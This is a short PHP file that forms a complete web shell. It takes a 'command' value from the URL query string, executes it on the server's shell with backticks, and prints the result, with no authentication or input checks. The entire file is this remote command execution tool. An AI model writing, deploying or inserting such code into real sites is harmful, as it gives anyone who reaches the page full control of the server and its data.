<?php

$command = isset( $_GET['command'] ) ? $_GET['command'] : '';
echo '<pre>';
echo `{$command}`;